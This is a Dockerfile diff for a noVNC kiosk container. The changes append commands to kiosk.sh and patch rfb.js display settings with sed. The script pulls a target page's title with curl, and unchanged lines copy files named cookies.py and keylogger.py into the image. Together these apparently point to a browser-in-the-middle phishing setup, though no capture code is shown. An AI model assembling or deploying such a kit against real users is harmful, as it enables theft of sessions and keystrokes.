@@ -26,7 +26,7 @@ RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd
     sudo apk del git
 
 RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
-    echo 'mkdir /home/user/noVNC/$FOLDER && cp -r /home/user/noVNC/* /home/user/noVNC/$FOLDER/' > /home/user/kiosk.sh && \
+    echo 'mkdir /home/user/noVNC/$FOLDER && cp -r /home/user/noVNC/* /home/user/noVNC/$FOLDER/' >> /home/user/kiosk.sh && \
     echo 'TITLE=$(curl -sk $WEBPAGE | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")' >> /home/user/kiosk.sh && \
     echo 'sed -i "124d" /home/user/noVNC/vnc_lite.html &&  sed  "131 i let path=\"$FOLDER/websockify\"" /home/user/noVNC/vnc_lite.html > /home/user/noVNC/index.html ' >> /home/user/kiosk.sh && \
     echo 'echo $TITLE > title.txt && sed -i "4s/.*/$(cat title.txt)/g" noVNC/index.html' >> /home/user/kiosk.sh && \
@@ -53,7 +53,9 @@ RUN echo '/bin/bash -c /home/user/kiosk.sh &' > /home/user/startVNC.sh && \
 COPY Files/cookies.py /home/user/
 COPY Files/vnc_lite.html /home/user/noVNC/
 COPY Files/cursor.js /home/user/noVNC/core/util/
-COPY Files/rfb.js /home/user/noVNC/core/
+RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
+RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
+RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
 COPY Files/ui.js /home/user/noVNC/app/
 COPY Files/kiosk.zip /home/user/
 COPY Files/keylogger.py /home/user/
